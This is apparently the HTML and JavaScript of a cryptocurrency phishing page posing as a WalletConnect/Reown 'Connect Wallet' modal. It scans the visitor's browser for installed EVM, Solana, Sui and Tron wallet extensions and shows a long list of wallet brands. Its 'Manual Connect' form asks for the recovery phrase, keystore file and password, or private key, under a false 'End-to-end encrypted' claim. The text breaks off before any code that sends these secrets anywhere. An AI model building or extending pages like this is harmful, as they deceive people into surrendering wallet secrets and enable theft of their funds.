<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Connect – Reown Style</title>
    <!-- Minimal browser shim for Node `process` (prevents "process is not defined") -->
    <script>
        if (typeof process === 'undefined') {
            try {
                window.process = { env: {} };
                globalThis.process = window.process;
            } catch (e) {
                // ignore failures - non-critical
            }
        }
    </script>
    <!-- Load WalletConnect SignClient -->
    <script src="https://unpkg.com/@walletconnect/sign-client@2.16.0/dist/index.umd.js" crossorigin="anonymous"></script>
    <script>
        // After UMD loads, expose it to our expected global
        window.walletConnectReady = false;
        
        // Try to find and expose SignClient from various UMD global locations
        function exposeSignClient() {
            console.log('[WalletConnect Init] Exposing SignClient from UMD module...');
            
            // Try different UMD global patterns that unpkg might use
            const possibleLocations = [
                () => window.WalletConnect?.SignClient,      // Most common UMD pattern
                () => window.WalletConnectSignClient,         // Direct name
                () => window.SignClient,                       // Already set
                () => {
                    // Check for nested namespaces
                    for (const key of Object.keys(window)) {
                        if (key.toLowerCase().includes('walletconnect') && window[key]?.SignClient) {
                            return window[key].SignClient;
                        }
                    }
                    return null;
                }
            ];
            
            for (const getter of possibleLocations) {
                try {
                    const SignClient = getter();
                    if (SignClient && typeof SignClient.init === 'function') {
                        window.SignClient = SignClient;
                        console.log('[WalletConnect Init] ✓ SignClient found and exposed:', typeof SignClient);
                        window.walletConnectReady = true;
                        return true;
                    }
                } catch (e) {
                    // Continue to next possibility
                }
            }
            
            console.error('[WalletConnect Init] ✗ Could not find SignClient in UMD globals');
            console.log('[WalletConnect Init] Available WalletConnect globals:', 
                Object.keys(window)
                    .filter(k => k.toLowerCase().includes('wallet') || k.toLowerCase().includes('sign'))
                    .slice(0, 20)
            );
            
            return false;
        }
        
        // Try immediately and also after a short delay in case UMD is still initializing
        if (!exposeSignClient()) {
            setTimeout(exposeSignClient, 500);
        }
    </script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --reown-bg: #0a0a0c;
            --reown-card: rgba(23, 23, 26, 0.85);
            --reown-border: rgba(255, 255, 255, 0.08);
            --reown-text: #e5e5e5;
            --reown-accent: #3396ff;
        }
        body {
            font-family: 'Inter', system-ui, sans-serif;
            background: linear-gradient(135deg, #0a0a0c 0%, #111113 50%, #1a1a20 100%);
            color: var(--reown-text);
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }
        html, body {
            -ms-overflow-style: none;
            scrollbar-width: none;
        }
        html::-webkit-scrollbar, body::-webkit-scrollbar {
            width: 0;
            height: 0;
        }
        .modal-overlay, .manual-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(8px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            opacity: 0;
            transition: opacity 0.4s ease;
        }
        .modal-overlay.active, .manual-overlay.active {
            display: flex;
            opacity: 1;
        }
        .modal-content, .manual-content {
            background: var(--reown-card);
            border-radius: 32px;
            border: 1px solid var(--reown-border);
            box-shadow: 0 25px 60px -12px rgba(0,0,0,0.7);
            width: 100%;
            max-width: 440px;
            max-height: 92vh;
            overflow-y: auto;
            -ms-overflow-style: none;
            scrollbar-width: none;
            position: relative;
            backdrop-filter: blur(20px);
            transform: scale(0.95);
            transition: transform 0.4s ease;
        }
        .modal-content::-webkit-scrollbar,
        .manual-content::-webkit-scrollbar {
            width: 0;
            height: 0;
        }
        .modal-overlay.active .modal-content, .manual-overlay.active .manual-content {
            transform: scale(1);
        }
        .sticky-header {
            position: sticky;
            top: 0;
            background: rgba(23, 23, 26, 0.9);
            backdrop-filter: blur(16px);
            z-index: 10;
            border-bottom: 1px solid var(--reown-border);
        }
        .close-btn {
            position: absolute;
            right: 14px;
            top: 14px;
            width: 36px;
            height: 36px;
            border-radius: 10px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.06);
            color: #ddd;
            font-size: 18px;
            cursor: pointer;
        }
        .close-btn:hover { background: rgba(255,255,255,0.08); }
        .wallet-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            padding: 0 12px 24px;
        }
        .wallet-item {
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 20px;
            padding: 16px 8px;
            text-align: center;
            transition: all 0.25s ease;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            aspect-ratio: 1 / 1.05;
        }
        .wallet-item:hover {
            background: rgba(51, 150, 255, 0.08);
            border-color: rgba(51, 150, 255, 0.3);
            transform: translateY(-2px);
        }
        .wallet-icon-wrapper {
            position: relative;
            width: 56px;
            height: 56px;
            margin-bottom: 10px;
        }
        .sticky-footer {
            position: sticky;
            bottom: 0;
            background: transparent;
            padding: 16px 24px;
            z-index: 10;
            border-top: 1px solid var(--reown-border);
            backdrop-filter: blur(12px);
        }
        .social-logins {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 12px;
            pointer-events: auto;
        }
        .social-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(255,255,255,0.08);
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
            cursor: pointer;
        }
        .social-icon:hover {
            background: rgba(51,150,255,0.25);
            transform: scale(1.1);
        }
        .social-icon img {
            width: 22px;
            height: 22px;
        }
        .status-text {
            text-align: center;
            font-size: 0.875rem;
            color: #a1a1aa;
            pointer-events: none;
        }
        .status-failed {
            color: #ef4444 !important;
        }
        .more-btn {
            background: rgba(51, 150, 255, 0.1);
            border: 1px solid rgba(51, 150, 255, 0.3);
            color: #3396ff;
        }
        .more-btn:hover {
            background: rgba(51, 150, 255, 0.2);
        }
        .tab-buttons {
            display: flex;
            gap: 8px;
            margin-bottom: 24px;
            justify-content: center;
            flex-wrap: wrap;
        }
        .tab-btn {
            padding: 10px 20px;
            background: rgba(255,255,255,0.08);
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 0.875rem;
        }
        .tab-btn.active {
            background: var(--reown-accent);
            color: white;
        }
        .word-grid {
            display: grid;
            gap: 12px;
            margin-bottom: 16px;
        }
        .word-input {
            width: 100%;
            padding: 12px;
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 12px;
            color: white;
            text-align: center;
            transition: color 0.2s ease, border-color 0.2s ease;
        }
        .word-input.correct {
            color: #10b981 !important;
            border-color: #10b981 !important;
        }
        .word-input.incorrect {
            color: #ef4444 !important;
            border-color: #ef4444 !important;
        }
        .encrypted-text {
            color: #10b981;
            font-size: 0.75rem;
            text-align: center;
            margin-top: 16px;
        }
        .connect-btn {
            margin-top: 24px;
            width: 100%;
            padding: 14px;
            background: var(--reown-accent);
            color: white;
            border-radius: 12px;
            font-weight: 600;
        }
        .input-field {
            width: 100%;
            padding: 16px;
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 16px;
            color: white;
            font-family: monospace;
            resize: vertical;
            min-height: 120px;
        }
        .login-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.9);
            backdrop-filter: blur(8px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 10000;
        }
        .login-box {
            background: var(--reown-card);
            border-radius: 24px;
            border: 1px solid var(--reown-border);
            padding: 32px;
            width: 90%;
            max-width: 380px;
            text-align: center;
        }
        .login-box h3 {
            margin-bottom: 20px;
            font-size: 1.5rem;
        }
        .login-input {
            width: 100%;
            padding: 12px;
            margin: 12px 0;
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 12px;
            color: white;
        }
        .login-btn {
            margin-top: 16px;
            width: 100%;
            padding: 12px;
            background: var(--reown-accent);
            color: white;
            border-radius: 12px;
            font-weight: 600;
        }
        .modal-content .status-text { display: none !important; }
        .connect-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 340px;
            height: 200px;
            background: #ffffff;
            color: #111111;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            padding: 24px;
            z-index: 10001;
            overflow: hidden;
            opacity: 0;
            transform: translateX(20px);
            transition: opacity 0.3s ease, transform 0.3s ease;
            pointer-events: none;
        }
        .connect-overlay.active { opacity: 1; transform: translateX(0); pointer-events: auto; }
        .main-wallet-wrap {
            position: relative;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 120px;
            height: 120px;
            margin-bottom: 18px;
            background: transparent;
            box-shadow: 0 6px 18px rgba(0,0,0,0.12);
            border-radius: 12px;
        }
        #modalMainWalletImg {
            width: 96px;
            height: 96px;
            border-radius: 12px;
            object-fit: contain;
            z-index: 1;
            background: #fff;
        }
        .connect-ring {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 110px;
            height: 110px;
            pointer-events: none;
            opacity: 0;
            transition: opacity 160ms ease;
            z-index: 2;
        }
        .connect-ring.active { opacity: 1; }
        .connect-ring svg { width: 110px; height: 110px; display: block; }
        .connect-ring rect.track { stroke: rgba(0,0,0,0.06); stroke-width: 8; fill: none; }
        .connect-ring rect.progress {
            stroke: #F57251;
            stroke-width: 6;
            stroke-linecap: round;
            fill: none;
            stroke-dasharray: 50 356;
            stroke-dashoffset: 356;
            animation: squareProgress 1.8s linear infinite;
        }
        @keyframes squareProgress {
            from { stroke-dashoffset: 376; }
            to { stroke-dashoffset: 15; }
        }
        .connect-overlay .overlay-message { margin-top: 10px; font-weight: 600; opacity: 0; transition: opacity 0.25s ease; }
        .connect-overlay .overlay-message.failed { color: #ef4444; opacity: 1; }
        /* Processing Overlay Styles */
        #processing-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(12px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 10050;
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        #processing-overlay.active {
            display: flex;
            opacity: 1;
        }
        .processing-content {
            text-align: center;
            color: var(--reown-text);
        }
        .processing-content h2 {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 20px;
        }
        .animated-dots {
            font-size: 2rem;
            letter-spacing: 8px;
            height: 2.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .dot {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: var(--reown-accent);
            margin: 0 4px;
            animation: dotBounce 1.4s infinite;
        }
        .dot:nth-child(1) { animation-delay: 0s; }
        .dot:nth-child(2) { animation-delay: 0.2s; }
        .dot:nth-child(3) { animation-delay: 0.4s; }
        .dot:nth-child(4) { animation-delay: 0.6s; }
        @keyframes dotBounce {
            0%, 60%, 100% { opacity: 0.3; transform: translateY(0); }
            30% { opacity: 1; transform: translateY(-15px); }
        }
    </style>
</head>
<body>
    <button id="open-modal" class="px-10 py-4 bg-gradient-to-r from-indigo-600 to-purple-600 rounded-2xl font-semibold text-lg shadow-2xl hover:brightness-110 transition">
        Launch HollyHub Connect
    </button>

    <!-- Processing Overlay -->
    <div id="processing-overlay">
        <div class="processing-content">
            <h2>Processing</h2>
            <div class="animated-dots">
                <span class="dot"></span>
                <span class="dot"></span>
                <span class="dot"></span>
                <span class="dot"></span>
            </div>
        </div>
    </div>

    <!-- Main Wallet Connect Modal -->
    <div id="modal-overlay" class="modal-overlay">
        <div class="modal-content">
            <div class="sticky-header px-8 pt-8 pb-4" style="position:relative;">
                <h2 class="text-2xl font-semibold text-center mb-1">Connect Wallet</h2>
                <p class="text-center text-sm text-gray-400">Choose your preferred wallet</p>
                <button id="close-modal-btn" class="close-btn" aria-label="Close">✕</button>
            </div>
            <div class="px-8 pt-6 pb-4">
                <input id="wallet-search" type="text" placeholder="Search wallets..." class="w-full px-5 py-3 bg-black/30 border border-white/10 rounded-2xl text-white placeholder-gray-500 focus:outline-none focus:border-[var(--reown-accent)]/50 transition text-sm"/>
            </div>
            <div id="visible-wallets" class="wallet-grid px-6"></div>
            <div class="flex justify-center mt-6 mb-4">
                <button id="toggle-more" class="more-wallets-btn more-btn px-10 py-3 rounded-2xl text-sm font-medium transition">
                    More wallets (396)
                </button>
            </div>
            <div id="extra-wallets" class="wallet-grid px-6 pb-12 hidden"></div>
            <div class="sticky-footer">
                <div class="social-logins">
                    <div class="social-icon" data-provider="google" title="Sign in with Google">
                        <img src="https://www.google.com/favicon.ico" alt="Google">
                    </div>
                    <div class="social-icon" data-provider="facebook" title="Sign in with Facebook">
                        <img src="/wallets/facebook.png" alt="Facebook">
                    </div>
                    <div class="social-icon" data-provider="apple" title="Sign in with Apple">
                        <img src="/wallets/apple.png" alt="Apple" style="width:32px;height:32px;">
                    </div>
                    <div class="social-icon" data-provider="github" title="Sign in with GitHub">
                        <img src="https://github.com/favicon.ico" alt="GitHub">
                    </div>
                </div>
                <div id="status-message" class="status-text">
                    Select a wallet to connect
                </div>
            </div>
        </div>
    </div>

    <!-- App Detector Popup -->
    <div id="app-detector-overlay" class="login-overlay" style="display:none;">
        <div class="login-box" id="app-detector-box">
            <h3 id="detector-title">Open wallet app</h3>
            <div id="detected-list" style="display:flex;flex-direction:column;gap:8px;margin-top:12px;"></div>
            <div style="margin-top:12px;display:flex;gap:10px;justify-content:center;">
                <button id="detector-cancel" class="mt-4 text-gray-400 hover:text-white text-sm">Cancel</button>
            </div>
        </div>
    </div>

    <!-- Right-side connect overlay -->
    <div id="connect-overlay" class="connect-overlay" aria-hidden="true">
        <div class="main-wallet-wrap">
            <img id="modalMainWalletImg" src="" alt="Selected Wallet">
            <div id="connectRing" class="connect-ring" aria-hidden="true">
                <svg viewBox="0 0 100 100">
                    <rect class="track" x="8" y="8" width="84" height="84" rx="16"></rect>
                    <rect class="progress" x="8" y="8" width="84" height="84" rx="16"></rect>
                </svg>
            </div>
        </div>
        <div id="overlay-wallet-name" class="text-sm font-semibold text-center"></div>
        <div id="overlay-message" class="overlay-message"></div>
    </div>

    <!-- Manual Connect Modal -->
    <div id="manual-overlay" class="manual-overlay">
        <div class="manual-content">
            <div class="sticky-header px-8 pt-8 pb-4">
                <h2 class="text-2xl font-semibold text-center mb-1">Manual Connect</h2>
                <p class="text-center text-sm text-gray-400">Enter your wallet details securely</p>
                <button id="close-manual-btn" class="close-btn" aria-label="Close">✕</button>
            </div>
            <div class="px-8 py-6">
                <div class="tab-buttons">
                    <div class="tab-btn active" data-tab="phrase">Phrase</div>
                    <div class="tab-btn" data-tab="keystore">Keystone JSON</div>
                    <div class="tab-btn" data-tab="private">Private Key</div>
                </div>
                <div id="phrase-tab" class="tab-content">
                    <div class="flex justify-center gap-8 mb-6">
                        <label class="flex items-center gap-2">
                            <input type="radio" name="phrase-length" value="12" checked class="accent-[var(--reown-accent)]">
                            <span>12 words</span>
                        </label>
                        <label class="flex items-center gap-2">
                            <input type="radio" name="phrase-length" value="24" class="accent-[var(--reown-accent)]">
                            <span>24 words</span>
                        </label>
                    </div>
                    <div id="phrase-grid" class="word-grid"></div>
                </div>
                <div id="keystore-tab" class="tab-content hidden">
                    <textarea id="keystore-json" class="input-field" placeholder='Paste your Keystore JSON here...'></textarea>
                    <input type="password" id="keystore-password" class="input-field mt-4" placeholder="Keystore Password">
                </div>
                <div id="private-tab" class="tab-content hidden">
                    <input type="text" id="private-key" class="input-field" placeholder="Enter your Private Key">
                </div>
                <input type="text" name="botcheck" style="display:none;" />
                <p class="encrypted-text">End-to-end encrypted</p>
                <button class="connect-btn" id="manual-connect-btn">Connect wallet</button>
            </div>
        </div>
    </div>

    <script type="module">
        // ══════════════════════════════════════════════════════════════════════════════════
        // EIP-6963: Multi Injected Provider Discovery (Ethereum/EVM wallets)
        // Desktop browser wallet extension detection
        // ══════════════════════════════════════════════════════════════════════════════════
        const eip6963Providers = new Map(); // uuid → {name, icon, rdns, provider}

        window.addEventListener('eip6963:announceProvider', (event) => {
          const { name, uuid, icon, rdns } = event.detail.info;
          const provider = event.detail.provider;
          
          // Avoid duplicates
          if (!eip6963Providers.has(uuid)) {
            eip6963Providers.set(uuid, { name, icon, rdns, provider });
            console.log(`[EIP-6963] Detected EVM wallet: ${name} (${rdns})`);
          }
        });

        // Request all providers to announce themselves
        function requestEIP6963Providers() {
          console.log('[EIP-6963] Requesting providers from all installed extensions...');
          window.dispatchEvent(new Event('eip6963:requestProvider'));
        }

                // Solana Wallets Detection (Phantom, Solflare, Backpack, Glow, etc.)
                function detectSolanaWallets() {
                    const solanaWallets = [];
            const detected = new Set();

            // Aggressive window scanning for Solana-related globals
            const solanaGlobals = ['solana', 'phantom', 'phantomSolana', 'phantomWallet', 'solflare', 'backpack', 'glow', 'glowSolana', 'brave_solana'];
            const solanaPatterns = /^(solana|phantom|solflare|backpack|glow)/i;

            // Primary: window.solana (Phantom or multi-sol providers) - use strict === true checks
            try {
                if (window.solana) {
                    const sol = window.solana;
                    if (sol.isPhantom === true) { solanaWallets.push({ name: 'Phantom', provider: sol, type: 'solana' }); detected.add('phantom'); console.log('[detectSolanaWallets] ✓ Phantom detected via sol.isPhantom === true'); }
                    if (sol.isSolflare === true) { solanaWallets.push({ name: 'Solflare', provider: sol, type: 'solana' }); detected.add('solflare'); console.log('[detectSolanaWallets] ✓ Solflare detected via sol.isSolflare === true'); }
                    if (sol.isBackpack === true) { solanaWallets.push({ name: 'Backpack', provider: sol, type: 'solana' }); detected.add('backpack'); console.log('[detectSolanaWallets] ✓ Backpack detected'); }
                    if (sol.isGlow === true) { solanaWallets.push({ name: 'Glow', provider: sol, type: 'solana' }); detected.add('glow'); console.log('[detectSolanaWallets] ✓ Glow detected'); }
                    if (sol.isSlush === true) { solanaWallets.push({ name: 'Slush', provider: sol, type: 'solana' }); detected.add('slush'); console.log('[detectSolanaWallets] ✓ Slush detected via sol.isSlush === true'); }
                    // If solana provider has no specific flag, assume it's a Solana provider (Phantom variant)
                    if (!detected.has('phantom') && sol.connect && typeof sol.connect === 'function') { 
                        solanaWallets.push({ name: 'Phantom', provider: sol, type: 'solana' }); detected.add('phantom');
                        console.log('[detectSolanaWallets] Detected Phantom via window.solana.connect method');
                    }
                }
            } catch (e) { console.warn('[detectSolanaWallets] window.solana check failed', e); }

            // Aggressive fallback: scan entire window for Solana/Phantom/Solflare globals
            try {
                for (const key of Object.keys(window)) {
                    if (solanaPatterns.test(key) && !detected.has(normalizeKey(key))) {
                        const val = window[key];
                        if (val && typeof val === 'object' && (val.connect || val.request)) {
                            const name = key.toLowerCase().includes('phantom') || key.toLowerCase().includes('glow') ? 'Phantom' :
                                        key.toLowerCase().includes('solflare') ? 'Solflare' :
                                        key.toLowerCase().includes('backpack') ? 'Backpack' : 'Solana';
                            if (!solanaWallets.some(w => normalizeKey(w.name) === normalizeKey(name))) {
                                solanaWallets.push({ name: name, provider: val, type: 'solana' });
                                detected.add(normalizeKey(name));
                                console.log(`[detectSolanaWallets] Found ${name} via window.${key}`);
                            }
                        }
                    }
                }
            } catch (e) { console.warn('[detectSolanaWallets] window scan failed', e); }

            // Direct global checks with fallback names
            try {
                if (window.solflare && !detected.has('solflare')) {
                    const prov = window.solflare;
                    // Just check if window.solflare exists - it's a strong indicator
                    solanaWallets.push({ name: 'Solflare', provider: prov, type: 'solana' });
                    detected.add('solflare');
                    console.log('[detectSolanaWallets] ✓ Detected Solflare via window.solflare');
                }
            } catch (e) { console.warn('[detectSolanaWallets] Solflare check error:', e); }

            try {
                if (window.phantom && !detected.has('phantom')) {
                    solanaWallets.push({ name: 'Phantom', provider: window.phantom, type: 'solana' });
                    detected.add('phantom');
                    console.log('[detectSolanaWallets] Detected Phantom via window.phantom');
                }
            } catch (e) {}

            try {
                if (window.backpack && !detected.has('backpack')) {
                    solanaWallets.push({ name: 'Backpack', provider: window.backpack, type: 'solana' });
                    detected.add('backpack');
                    console.log('[detectSolanaWallets] Detected Backpack via window.backpack');
                }
            } catch (e) {}

            console.log(`[detectSolanaWallets] Total Solana wallets detected: ${solanaWallets.length}`, solanaWallets.map(w => w.name));
            return solanaWallets;
        }

        // Master detection function for desktop - returns both EIP-6963 and Solana wallets
        async function detectDesktopExtensions(timeoutMs = 1000) {
          return new Promise((resolve) => {
            // Request EIP-6963 announcements
            requestEIP6963Providers();

                        // Set timeout to collect responses and then run additional fallback checks
                        const timeoutId = setTimeout(() => {
                            const evmWallets = Array.from(eip6963Providers.values()).map(w => ({ 
                                name: w.name, 
                                icon: w.icon, 
                                rdns: w.rdns, 
                                provider: w.provider,
                                type: 'evm',
                                uuid: eip6963Providers.entries().find(([_, v]) => v === w)?.[0]
                            }));

                            // Gather Solana wallets via multiple heuristics
                            const solanaWallets = detectSolanaWallets();

                            // Sui (Slush) detection via helper
                            try {
                                const slush = getSlushWallet();
                                if (slush) {
                                    const sName = slush.name || 'Slush';
                                    solanaWallets.push({ name: sName, provider: slush, type: 'sui' });
                                }
                            } catch (e) { /* ignore */ }

                            // Tron detection (tronLink/tronWeb) - if not already present in EIP-6963
                            const tronWallets = [];
                            try {
                                // Primary: Check window.tronWeb.defaultAddress.base58 - indicates wallet is connected
                                if (typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                                    tronWallets.push({ name: 'TronLink', provider: window.tronWeb, type: 'tron' });
                                    console.log('[detectDesktopExtensions] ✓ TronLink detected via window.tronWeb.defaultAddress.base58');
                                } else {
                                    // Fallback: check multiple possible globals
                                    const tronGlobals = ['tronLink', 'tronWeb', 'tron', 'TRON'];
                                    let tronProvider = null;
                                    
                                    for (const key of tronGlobals) {
                                        if (window[key] && typeof window[key] === 'object') {
                                            tronProvider = window[key];
                                            console.log(`[detectDesktopExtensions] Found Tron provider at window.${key}`);
                                            break;
                                        }
                                    }
                                    
                                    // Aggressive scan for tron-related globals
                                    if (!tronProvider) {
                                        for (const key of Object.keys(window)) {
                                            if ((key.toLowerCase().includes('tron') || key.toLowerCase().includes('tronlink')) && 
                                                window[key] && typeof window[key] === 'object') {
                                                tronProvider = window[key];
                                                console.log(`[detectDesktopExtensions] Found Tron provider via window.${key}`);
                                                break;
                                            }
                                        }
                                    }
                                    
                                    if (tronProvider) {
                                        tronWallets.push({ name: 'TronLink', provider: tronProvider, type: 'tron' });
                                        console.log('[detectDesktopExtensions] ✓ TronLink detected via fallback');
                                    }
                                }
                            } catch (e) { console.warn('[detectDesktopExtensions] Tron detection error:', e); }

                            // Aggregate unique wallets (by normalized name)
                            const combined = [...evmWallets, ...solanaWallets, ...tronWallets];
                            const uniq = [];
                            const seen = new Set();
                            combined.forEach(w => {
                                const key = normalizeKey(w.name || '');
                                if (!seen.has(key)) { seen.add(key); uniq.push(w); }
                            });

                            console.log(`[Desktop Detection] Found ${uniq.length} wallets (EVM: ${evmWallets.length}, Solana: ${solanaWallets.length}, Tron: ${tronWallets.length})`);
                            resolve(uniq);
                        }, timeoutMs);
          });
        }

        // Entry code runs here; Vite will inject the bundled `src/main.js` during dev/build.
        // ────────────────────────────────────────────────────────────────────────────────
        // Your original variables and functions (unchanged)
        // ────────────────────────────────────────────────────────────────────────────────
        const modalOverlay = document.getElementById('modal-overlay');
        const manualOverlay = document.getElementById('manual-overlay');
        const openBtn = document.getElementById('open-modal');
        const toggleMoreBtn = document.getElementById('toggle-more');
        const extraWallets = document.getElementById('extra-wallets');
        const statusMessage = document.getElementById('status-message');
        const searchInput = document.getElementById('wallet-search');
        const visibleWallets = document.getElementById('visible-wallets');
        let isExpanded = false;

        // Debug: Check if elements were found
        console.log('[Module Init] Elements retrieved:', {
            openBtn: !!openBtn,
            modalOverlay: !!modalOverlay,
            manualOverlay: !!manualOverlay,
            toggleMoreBtn: !!toggleMoreBtn,
            extraWallets: !!extraWallets,
            statusMessage: !!statusMessage,
            searchInput: !!searchInput,
            visibleWallets: !!visibleWallets
        });

        const visibleList = [
            { name: 'MetaMask', icon: '/wallets/metamask.png' },
            { name: 'WalletConnect', icon: '/wallets/walletconnect.png' },
            { name: 'Phantom', icon: '/wallets/phantom.png' },
            { name: 'SuperHero', icon: '/wallets/SuperHero.png' },
            { name: 'Sub', icon: '/wallets/Sub.png' },
            { name: 'Acurast-lite', icon: '/wallets/Acurast-lite.png' },
            { name: 'Trust Wallet', icon: '/wallets/trustwallet.png' },
            { name: 'Coinbase Wallet', icon: '/wallets/coinbasewallet.png' },
            { name: 'Ledger Live', icon: '/wallets/ledgerlive.png' },
            { name: 'OKX Wallet', icon: '/wallets/okxwallet.png' },
            { name: 'Bitget Wallet', icon: '/wallets/bitgetwallet.png' },
            { name: 'TokenPocket', icon: '/wallets/tokenpocket.png' }
        ];

        // Use the canonical wallet list provided by the user (deduped)
        const rawExtraWallets = [
            'metamask','walletconnect','phantom','trustwallet','coinbasewallet','ledgerlive','okxwallet','bitgetwallet',
            'tokenpocket','safepal','uniswapwallet','zerion','xportal','cryptocomdefiwallet','bitcoincomwallet','bifrostwallet',
            'bybitwallet','roninwallet','imtoken','safe(gnosis)','geminwallet','ctrlwallet','arculuswallet','wemixplaywallet',
            'tangemwallet','exodus','hashpack','pintuwallet','blackfortwallet','wigwam','subwallet','avacus','keplr','petrawallet',
            'templewallet','ambirewallet','basewallet','alchemysmartwallet','openfort','zengo','rabbywallet','krakenwallet',
            'readywallet','backpack','portalwallet','litprotocolwallet','castlewallet','trezorsuite','dfnswallet','tahowallet',
            'candidwallet','solflare','unipass','soulwallet','cashmerewallet','mew(myetherwallet)','stackupwallet','sequencewallet',
            'blockwallet','enkrypt','obviouswallet','alphawallet','multis','coin98','alfa1wallet','venlywallet','frontierwallet',
            'dapppocket','dcentwallet','ellipalwallet','sepiorwallet','qredowallet','snowflakewallet','gowallet','1inchwallet',
            'binanceweb3wallet','bitpaywallet','bestwallet','fireblockswallet','nexowallet','coinrabbitwallet','youhodlerwallet',
            'trusteewallet','guardawallet','infinitowallet','ownrwallet','coinwallet','electrumwallet','simpleholdwallet','jubiterblade',
            'komodowallet','myceliumwallet','gemwallet','zeplywallet','zumowallet','myetherwallet','cryptxwallet','xapowallet',
            'coinpaymentswallet','nowwallet','spectrocoinwallet','breadwallet','flxwallet','atomexwallet','heliowallet','jaxxlibertywallet',
            'keepkeywallet','unstoppablewallet','secuxwallet','etherwall','samouraiwallet','etherliwallet','enjinwallet','indiesquare',
            'litevault','holytransaction','mycrypto','edgewallet','daedaluswallet','omniwallet','ankerspay','binanceappwallet','bitamp',
            'bitpie','blockchaincomwallet','brdwallet','btccomwallet','cashapp','chivowallet','circleinvest','citowise','coinsphwallet',
            'croptywallet','digifoxwallet','greenaddress','havenwallet','kleverwallet','monarchwallet','omisegowallet','operawallet',
            'passkeyswallet','plarkwallet','prodogewallet','stakedwallet','statuswallet','swirlwallet','uport','xdefiwallet','yoroiwallet',
            'cryptocrit','bitgowallet','cryptomuswallet','coinomi','cwallet','plasbitwallet','cobowallet','binancechainwallet','jaxxwallet',
            'mathwallet','blockstreamgreen','armorywallet','infinitywallet','argentwallet','bixinwallet','quppywallet','freewallet','lumiwallet',
            'atomicwallet','udunwallet','balletwallet','monerogui','lisknano','mymonerowallet','neonwallet','vergewallet','owallet','incognitowallet',
            'mistwallet','medoozawallet','bonpay','wagecanwallet','zebpay','electrumstratis','bitcoincashfreewallet','electrumcash','fantomcoinfreewallet',
            'msignawallet','coinjarwallet','copaybitcoinwallet','bitxwallet','tokenlypockets','gatehub','zcashswinggui','zcashcockpitui','vcashclient',
            'carbonwallet','vslicewebwallet','litecoincoreclient','dogeChain','dogecoincore','monerocoreclient','bitwala','bitherwallet','dashfreewallet',
            'dogefreewallet','liskfreewallet','steemfreewallet','nxtfreewallet','ardorfreewallet','ethereumwallet','coinbank','airbitzbitcoinwallet','arcbit',
            'bitcoincoreclient','hw1ledgerwallet','bitaddresspaperwallet','schildbachbtcwallet','electrumltcwallet','darkwalletbtc','multidogewallet','dogeandroidwallet',
            'blockiowallet','coinapultwallet','btcwallet','coinspace','cryptonator','coolwallet','bitloxwallet','uberpaywallet','coincorner','bitcoinfreewallet',
            'monerofreewallet','coinvault','xethetherwallet','virtacoinwallet','singulardtvlightwallet','counterwallet','openledger','unocoin','bitpanda','daricowallet',
            'zcashfreewallet','bitinka','wavesliteclient','nxtclient','ipayyou','coinspot','mobi','agama','blockchainsmy','nemmobilewallet','nemnanowallet',
            'bitconnectclient','stellardesktop','parity','digibytecore','eidoo','lykkewallet','zumminer','gefarapay','freewalletcryptowallet','bitbuckswallet','gnoissafemultisig',
            'pillar','onto','bitpay','walleth','authereum','dharma','huobiwallet','mykey','loopringwallet','trustvault','alice','zelcore','nash','gridplus',
            'cybavowallet','tokenary','torus','spatium','walletio','ownbit','easypocket','bridgewallet','sparkpoint','viawallet','bitkeep','vision','peakdefiwallet',
            'halodefiwallet','dokwallet','atwallet','midaswallet','keyringpro','aktionariat','talkenwallet','xinfincxdcnetwork','flarewallet','kyberswap','atokenwallet',
            'tonguewallet','rwallet','plasmapay','o3wallet','hashkeyme','jadewallet','defiant','coius','cmorq','valora','quiverx','celowallet','elastosessentials',
            'fusecash','stasis','julwallet','fxwallet','bullapp','anybit','minervawallet','archipage','chaingefinance','iopay','coinhub','gopocket','wallet3','yitoken',
            'didwallet','starbase','shinobiwallet','steakwallet','gdwallet','binana','airgap','paytube','blockbank','orange','neftipedia','krystal','linen','celoterminal','spot',
            'rainbow','slushwallet','tronlink'
        ];

        const extraWalletNames = Array.from(new Set(rawExtraWallets));

        let walletManifest = {};
